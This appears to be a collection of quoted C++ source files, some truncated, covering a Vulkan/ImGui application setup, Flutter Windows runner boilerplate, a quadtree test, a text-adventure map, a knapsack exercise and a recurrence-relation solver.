    "#include \"Application.h\"\n\n//\n// Adapted from Dear ImGui Vulkan example\n//\n\n#include \"backends/imgui_impl_glfw.h\"\n#include \"backends/imgui_impl_vulkan.h\"\n#include <stdio.h>          // printf, fprintf\n#include <stdlib.h>         // abort\n#define GLFW_INCLUDE_NONE\n#define GLFW_INCLUDE_VULKAN\n#include <GLFW/glfw3.h>\n#include <vulkan/vulkan.h>\n#include <glm/glm.hpp>\n\n#include <iostream>\n\n// Emedded font\n#include \"ImGui/Roboto-Regular.embed\"\n\nextern bool g_ApplicationRunning;\n\n// [Win32] Our example includes a copy of glfw3.lib pre-compiled with VS2010 to maximize ease of testing and compatibility with old VS compilers.\n// To link with VS2010-era libraries, VS2015+ requires linking with legacy_stdio_definitions.lib, which we do using this pragma.\n// Your own project should not be affected, as you are likely to link with a newer binary of GLFW that is adequate for your version of Visual Studio.\n#if defined(_MSC_VER) && (_MSC_VER >= 1900) && !defined(IMGUI_DISABLE_WIN32_FUNCTIONS)\n#pragma comment(lib, \"legacy_stdio_definitions\")\n#endif\n\n//#define IMGUI_UNLIMITED_FRAME_RATE\n#ifdef _DEBUG\n#define IMGUI_VULKAN_DEBUG_REPORT\n#endif\n\nstatic VkAllocationCallbacks* g_Allocator = NULL;\nstatic VkInstance               g_Instance = VK_NULL_HANDLE;\nstatic VkPhysicalDevice         g_PhysicalDevice = VK_NULL_HANDLE;\nstatic VkDevice                 g_Device = VK_NULL_HANDLE;\nstatic uint32_t                 g_QueueFamily = (uint32_t)-1;\nstatic VkQueue                  g_Queue = VK_NULL_HANDLE;\nstatic VkDebugReportCallbackEXT g_DebugReport = VK_NULL_HANDLE;\nstatic VkPipelineCache          g_PipelineCache = VK_NULL_HANDLE;\nstatic VkDescriptorPool         g_DescriptorPool = VK_NULL_HANDLE;\n\nstatic ImGui_ImplVulkanH_Window g_MainWindowData;\nstatic int                      g_MinImageCount = 2;\nstatic bool                     g_SwapChainRebuild = false;\n\n// Per-frame-in-flight\nstatic std::vector<std::vector<VkCommandBuffer>> s_AllocatedCommandBuffers;\nstatic std::vector<std::vector<std::function<void()>>> s_ResourceFreeQueue;\n\n// Unlike g_MainWindowData.FrameIndex, this is not the the swapchain image index\n// and is always guaranteed to increase (eg. 0, 1, 2, 0, 1, 2)\nstatic uint32_t s_CurrentFrameIndex = 0;\n\nstatic Walnut::Application* s_Instance = nullptr;\n\nvoid check_vk_result(VkResult err)\n{\n\tif (err == 0)\n\t\treturn;\n\tfprintf(stderr, \"[vulkan] Error: VkResult = %d\\n\", err);\n\tif (err < 0)\n\t\tabort();\n}\n\n#ifdef IMGUI_VULKAN_DEBUG_REPORT\nstatic VKAPI_ATTR VkBool32 VKAPI_CALL debug_report(VkDebugReportFlagsEXT flags, VkDebugReportObjectTypeEXT objectType, uint64_t object, size_t location, int32_t messageCode, const char* pLayerPrefix, const char* pMessage, void* pUserData)\n{\n\t(void)flags; (void)object; (void)location; (void)messageCode; (void)pUserData; (void)pLayerPrefix; // Unused arguments\n\tfprintf(stderr, \"[vulkan] Debug report from ObjectType: %i\\nMessage: %s\\n\\n\", objectType, pMessage);\n\treturn VK_FALSE;\n}\n#endif // IMGUI_VULKAN_DEBUG_REPORT\n\nstatic void SetupVulkan(const char** extensions, uint32_t extensions_count)\n{\n\tVkResult err;\n\n\t// Create Vulkan Instance\n\t{\n\t\tVkInstanceCreateInfo create_info = {};\n\t\tcreate_info.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n\t\tcreate_info.enabledExtensionCount = extensions_count;\n\t\tcreate_info.ppEnabledExtensionNames = extensions;\n#ifdef IMGUI_VULKAN_DEBUG_REPORT\n\t\t// Enabling validation layers\n\t\tconst char* layers[] = { \"VK_LAYER_KHRONOS_validation\" };\n\t\tcreate_info.enabledLayerCount = 1;\n\t\tcreate_info.ppEnabledLayerNames = layers;\n\n\t\t// Enable debug report extension (we need additional storage, so we duplicate the user array to add our new extension to it)\n\t\tconst char** extensions_ext = (const char**)malloc(sizeof(const char*) * (extensions_count + 1));\n\t\tmemcpy(extensions_ext, extensions, extensions_count * sizeof(const char*));\n\t\textensions_ext[extensions_count] = \"VK_EXT_debug_report\";\n\t\tcreate_info.enabledExtensionCount = extensions_count + 1;\n\t\tcreate_info.ppEnabledExtensionNames = extensions_ext;\n\n\t\t// Create Vulkan Instance\n\t\terr = vkCreateInstance(&create_info, g_Allocator, &g_Instance);\n\t\tcheck_vk_result(err);\n\t\tfree(extensions_ext);\n\n\t\t// Get the function pointer (required for any extensions)\n\t\tauto vkCreateDebugReportCallbackEXT = (PFN_vkCreateDebugReportCallbackEXT)vkGetInstanceProcAddr(g_Instance, \"vkCreateDebugReportCallbackEXT\");\n\t\tIM_ASSERT(vkCreateDebugReportCallbackEXT != NULL);\n\n\t\t// Setup the debug report callback\n\t\tVkDebugReportCallbackCreateInfoEXT debug_report_ci = {};\n\t\tdebug_report_ci.sType = VK_STRUCTURE_TYPE_DEBUG_REPORT_CALLBACK_CREATE_INFO_EXT;\n\t\tdebug_report_ci.flags = VK_DEBUG_REPORT_ERROR_BIT_EXT | VK_DEBUG_REPORT_WARNING_BIT_EXT | VK_DEBUG_REPORT_PERFORMANCE_WARNING_BIT_EXT;\n\t\tdebug_report_ci.pfnCallback = debug_report;\n\t\tdebug_report_ci.pUserData = NULL;\n\t\terr = vkCreateDebugReportCallbackEXT(g_Instance, &debug_report_ci, g_Allocator, &g_DebugReport);\n\t\tcheck_vk_result(err);\n#else\n\t\t// Create Vulkan Instance without any debug feature\n\t\terr = vkCreateInsta",
    "#include \"quad_tree.h\"\n#include <iostream>\n\n\nstruct Item {\n    float x;\n    float y;\n    float width;\n    float height;\n\n\n    Item(float x_in, float y_in, float width_in, float height_in) {\n        x = x_in;\n        y = y_in;\n        width = width_in;\n        height = height_in;\n    }\n    Item(){ x= 1; y = 1; width = 1; height = 1;}\n    float getX(){\n        return x;\n    }\n\n    float getY(){\n        return y;\n    }\n\n    float getWidth(){\n        return width;\n    }\n\n    float getHeight(){\n        return height;\n    }\n};\n\n\n\nint main() {\n\n    Item new_item1(3,3,2,2);\n    Item new_item2(2,3,2,3);\n    Item new_item3(3,1,3,3);\n\n    QuadTreeContainer<Item> new_tree(Point(0,0), Point(16,16));\n\n    new_tree.insert(new_item1);\n    new_tree.insert(new_item2);\n    new_tree.insert(new_item3);\n\n    //new_tree.pop_front();\n\n    std::list<QTI<Item> >::iterator first_item = new_tree.begin();\n\n    //new_tree.remove(last_item);\n\n    std::list<Item*> item_list;\n\n    item_list = new_tree.search(first_item);\n    for(auto it = item_list.begin(); it != item_list.end(); it++)\n    {\n        std::cout << \"x: \" << (*it)->x << \" y: \" << (*it)->y << std::endl;\n    }\n\n    /*first_item->item.x = 4;\n    first_item->item.y = 4;;\n    new_tree.reinsert(first_item);\n\n    item_list.clear();\n    item_list = new_tree.search(first_item->item);\n\n    for(auto it = item_list.begin(); it != item_list.end(); it++)\n    {\n        std::cout << \"x: \" << (*it)->x << \" y: \" << (*it)->y << std::endl;\n    }*/\n    \n\n    //item_list = new_tree.search(new_item3);\n\n    //std::cout<< \"item_list size= \" << item_list.size() << std::endl;\n\n    return 0;\n}\n\n\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <cctype>\n#include <algorithm>\n#include <random>\n\nusing namespace std;\n\nenum en_DIRS {NORTH, EAST, SOUTH, WEST};\nenum en_ROOMS {SOUTH_MAIN_ROAD, TAVERN, ANCIENT_TREESTUMP, ADVENTURERS_GUILD, FORGE, GLOWING_POND, WINE_CELLAR, STABLES, PATH_OUT_OF_TOWN, BRIDGE, PASTURE, SIDE_ROAD, TOWN_HALL, FOUNDERS_STATUE, NORTH_MAIN_ROAD, BAKERY, FORGOTTEN_PATH, GRAVEYARD, ABANDONED_HOUSE, OVERGROWN_GARDEN, VILLAGERS_HOUSES, SMALL_VILLAGE_GARDEN, MAYORS_HOME, BROKEN_FOUNTAIN, SHOPPING_CENTER, APOTHECARY};\nenum en_VERBS {GET, DROP, USE, OPEN, CLOSE, EXAMINE, INVENTORY, LOOK, SEARCH,EXCHANGE};\nenum en_NOUNS {CELLAR_DOOR, OLD_COIN, EMPTY_ALE_BOTTLE, BASKET_OF_EGGS, DOG_BONE, NEWS_PAPER, LOST_RING, WATERING_CAN, COIN_PURSE, LOVE_POTION, FLYER, CHEESE_WHEEL, RUBY, DAGGER, COCONUT_PIECES};\n\nconst int NONE = -1;\nconst int DIRS = 4;\nconst int ROOMS = 26;\nconst int VERBS = 10;\nconst int NOUNS = 15;\n\nclass Room {\npublic:\n    string description;\n    int exits[DIRS];\n\n    Room() {}\n    \n    Room(const string& desc) : description(desc) {\n        for (int i = 0; i < DIRS; ++i) {\n            exits[i] = NONE;\n        }\n    }\n    ~Room()\n    {\n    }\n};\n\nclass Noun {\npublic:\n    string word; \n    string description;\n    int code;\n    int location;\n    bool canCarry;\n\n    Noun() {}\n    \n    Noun(const string& word_, const string& desc, int code_, int location_ = NONE, bool canCarry_ = false)\n        : word(word_), description(desc), code(code_), location(location_), canCarry(canCarry_) {}\n    ~Noun()\n    {\n    }\n};\n\nclass Word {\npublic:\n    string str;\n    int code;\n\n    Word() {}\n\n    Word(const string& str_, const int& code_)\n        :str(str_), code(code_){}\n    ~Word()\n    {\n    }\n};\n\nvoid set_rooms(vector<Room>& rooms)\n{\n    rooms.resize(ROOMS);\n    rooms[SOUTH_MAIN_ROAD] = Room(\"The main road of the village\");\n    rooms[SOUTH_MAIN_ROAD].exits[NORTH] = NORTH_MAIN_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[EAST] = TAVERN;\n    rooms[SOUTH_MAIN_ROAD].exits[SOUTH] = SIDE_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[WEST] = ADVENTURERS_GUILD;\n\n    rooms[TAVERN] = Room(\"Loud tavern with a bar, and rooms for rent.\");\n    rooms[TAVERN].exits[NORTH] = SHOPPING_CENTER;\n    rooms[TAVERN].exits[EAST] = NONE;\n    rooms[TAVERN].exits[SOUTH] = NONE;\n    rooms[TAVERN].exits[WEST] = SOUTH_MAIN_ROAD;\n\n    rooms[ANCIENT_TREESTUMP] = Room(\"This old stump once was the home of the fae.\");\n    rooms[ANCIENT_TREESTUMP].exits[NORTH] = NONE;\n    rooms[ANCIENT_TREESTUMP].exits[EAST] = NORTH_MAIN_ROAD;\n    rooms[ANCIENT_TREESTUMP].exits[SOUTH] = ADVENTURERS_GUILD;\n    rooms[ANCIENT_TREESTUMP].exits[WEST] = NONE;\n\n    rooms[ADVENTURERS_GUILD] = Room(\"A place for adventurers to gather, drink, and rest.\");\n    rooms[ADVENTURERS_GUILD].exits[NORTH] = ANCIENT_TREESTUMP;\n    rooms[ADVENTURERS_GUILD].exits[EAST] = SOUTH_MAIN_ROAD;\n    rooms[ADVENTURERS_GUILD].exits[SOUTH] = NONE;\n    rooms[ADVENTURERS_GUILD].exits[WEST] = NONE;\n\n    rooms[FORGE] = Room(\"A Dwarven forge with a few beautifully crafted swords on display.\");\n    rooms[FORGE].exits[NORTH] = NONE;\n    rooms[FORGE].exits[EAST] = NONE;\n    rooms[FORGE].exits[SOUTH] = NONE;\n    rooms[FORGE].exits[WEST] = SHOPPING_CENTER;\n\n    rooms[GLOWING_POND] = Room(\"Theres a pond here that emits a mysterious glow. It's in the center of new village.\");\n    rooms[GLOWING_POND].exits[NORTH] = BRIDGE;\n    rooms[GLOWING_POND].exits[EAST] = WINE_CELLAR;\n    rooms[GLOWING_POND].exits[SOUTH] = NORTH_MAIN_ROAD;\n    rooms[GLOWING_POND].exits[WEST] = VILLAGERS_HOUSES;\n\n    rooms[WINE_CELLAR] = Room(\"A hidden wine cellar by the pond. Is it still in use?\");\n    rooms[WINE_CELLAR].exits[NORTH] = NONE;\n    rooms[WINE_CELLAR].exits[EAST] = NONE;\n    rooms[WINE_CELLAR].exits[SOUTH] = NONE;\n    rooms[WINE_CELLAR].exits[WEST] = NONE;\n\n    rooms[STABLES] = Room(\"Many horses are kept here. The smell of hay and manure is strong.\");\n    rooms[STABLES].exits[NORTH] = PASTURE;\n    rooms[STABLES].exits[EAST] = VILLAGERS_HOUSES;\n    rooms[STABLES].exits[SOUTH] = NONE;\n    rooms[STABLES].exits[WEST] = NONE;\n\n    rooms[PATH_OUT_OF_TOWN] = Room(\"A path leading out of town. It looks a bit rough.\");\n    rooms[PATH_OUT_OF_TOWN].exits[NORTH] = NONE;\n    rooms[PATH_OUT_OF_TOWN].exits[EAST] = FORGOTTEN_PATH;\n    rooms[PATH_OUT_OF_TOWN].exits[SOUTH] = BRIDGE;\n    rooms[PATH_OUT_OF_TOWN].exits[WEST] = NONE;\n\n    rooms[BRIDGE] = Room(\"A stone bridge that leads to the path out of town. It looks newly built.\");\n    rooms[BRIDGE].exits[NORTH] = PATH_OUT_OF_TOWN;\n    rooms[BRIDGE].exits[EAST] = NONE;\n    rooms[BRIDGE].exits[SOUTH] = GLOWING_POND;\n    rooms[BRIDGE].exits[WEST] = NONE;\n\n    rooms[PASTURE] = Room(\"A pasture for adventurers horses to graze.\");\n    rooms[PASTURE].exits[NORTH] = NONE;\n    rooms[PASTURE].exits[EAST] = NONE;\n    rooms[PASTURE].exits[SOUTH] = STABLES;\n    rooms[PASTURE].exits[WEST] = NONE;\n\n    rooms[SIDE_ROAD] = Room(\"A small side road that leads to the important places in town.\");\n    roo",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"practice_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n//  main.cpp\n//  KnapsackProblem\n//\n//  Created by Woo Sung Jahng on 2024/04/24.\n//\n\n#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\n// Class for single element in set V\nclass Object {\nprivate:\n    int num; // Object No.\n    int size; // Size of object\n    int price; // Price of object\npublic:\n    Object(int num, int size, int price) {\n        this->num = num;\n        this->size = size;\n        this->price = price;\n    }\n    // Read object no.\n    int objnum() {\n        return num;\n    }\n    // Read the size of object\n    int objsize() {\n        return size;\n    }\n    // Read the price of object\n    int objprice() {\n        return price;\n    }\n};\n\n// Function for comparing price per size of two objects\nbool PricePerSize(Object& a, Object& b) {\n    return a.objprice()/a.objsize() > b.objprice()/b.objsize();\n}\n\nint main(int argc, const char * argv[]) {\n    int n, b, i, j;\n    \n    // Input n(size of set V)\n    n = 4;\n    \n    // Input b(size of knapsack)\n    b = 13;\n    \n    vector<int> sizes(n);\n    vector<int> prices(n);\n    \n    // Input size and price of objects\n    sizes = {2, 3, 5, 7};\n    prices = {500, 1000, 800, 900};\n    \n    vector<Object> obj;\n    for (i=0; i<n; i++) {\n        obj.emplace_back(i, sizes[i], prices[i]);\n    }\n    \n    // Sort objects by price per size by higher to lower\n    sort(obj.begin(), obj.end(), PricePerSize);\n    \n    \n//    // Check sorted vector obj\n//    cout << \"Order of sorted obj : \";\n//    for (auto& object : obj) cout << object.objnum() << \" \";\n//    cout << endl;\n    \n    int currentSize = 0;\n    int totalPrice = 0;\n    int maxPrice = 0;\n    \n    for (j=0; j<n; j++) {\n        for (i=j; i<n; i++) {\n            if (currentSize + obj[i].objsize() <= b) {\n                currentSize += obj[i].objsize();\n                totalPrice += obj[i].objprice();\n//                // Track calculation\n//                cout << '+' << obj[i].objprice() << endl;\n            }\n        }\n        if (totalPrice >= maxPrice) maxPrice = totalPrice;\n    }\n\n    // Print the maximum price value\n    cout << maxPrice << endl;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <math.h>\nusing namespace std;\n\nfloat formula(float x_0, float x_1, float x_2, float a_0, float a_1, float a_2, int n) {\n    if (n == 2) return a_2;\n    if (n == 1) return a_1;\n    if (n == 0) return a_0;\n    \n    float result;\n    float det = (x_1*x_2*x_2 - x_2*x_1*x_1) - (x_0*x_2*x_2 - x_2*x_0*x_0) + (x_0*x_1*x_1 - x_1*x_0*x_0);\n    float l_0 = (a_0*(x_1*x_2*x_2 - x_2*x_1*x_1) - a_1*(x_2*x_2 - x_1*x_1) + a_2*(x_2 - x_1)) / det;\n    float l_1 = (-a_0*(x_0*x_2*x_2 - x_2*x_0*x_0) + a_1*(x_2*x_2 - x_0*x_0) - a_2*(x_2 - x_0)) / det;\n    float l_2 = (a_0*(x_0*x_1*x_1 - x_1*x_0*x_0) - a_1*(x_1*x_1 - x_0*x_0) + a_2*(x_1 - x_0)) / det;\n\n    result = l_0 * pow(x_0, n) + l_1 * pow(x_1, n) + l_2 * pow(x_2, n);\n\n    return result;\n}\n\nfloat rekurzija(float x_0, float x_1, float x_2, float a_0, float a_1, float a_2, int n) {\n    if (n == 2) return a_2;\n    if (n == 1) return a_1;\n    if (n == 0) return a_0;\n\n    float c_1 = x_0 + x_1 + x_2;\n    float c_2 = -(x_0 * x_1) - (x_0 * x_2) - (x_1 * x_2);\n    float c_3 = x_0 * x_1 * x_2;\n\n    float result;\n    result = c_1 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 1)\n             + c_2 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 2)\n             + c_3 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 3);\n\n    return result;\n}\n\nint main(void) {\n    float x_0, x_1, x_2;\n    float a_0, a_1, a_2;\n    int n;\n    \n    cout << \"Unesite prvo rjesenje x_0 karakteristicne jednadzbe: \";\n    cin >> x_0;\n    cout << \"Unesite drugo rjesenje x_1 karakteristicne jednadzbe: \";\n    cin >> x_1;\n    cout << \"Unesite trece rjesenje x_2 karakteristicne jednadzbe: \";\n    cin >> x_2;\n    cout << \"Unesite vrijednost nultog clana niza a_0: \";\n    cin >> a_0;\n    cout << \"Unesite vrijednost prvog clana niza a_1: \";\n    cin >> a_1;\n    cout << \"Unesite vrijednost drugog clana niza a_2: \";\n    cin >> a_2;\n    cout << \"Unesite redni broj n trazenog clana niza: \";\n    cin >> n;\n\n    cout << \"Vrijednost n-tog clana niza pomocu formule: \" << formula(x_0, x_1, x_2, a_0, a_1, a_2, n) << endl;\n    cout << \"Vrijednost n-tog clana niza iz rekurzije: \" << rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n) << endl;\n\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return 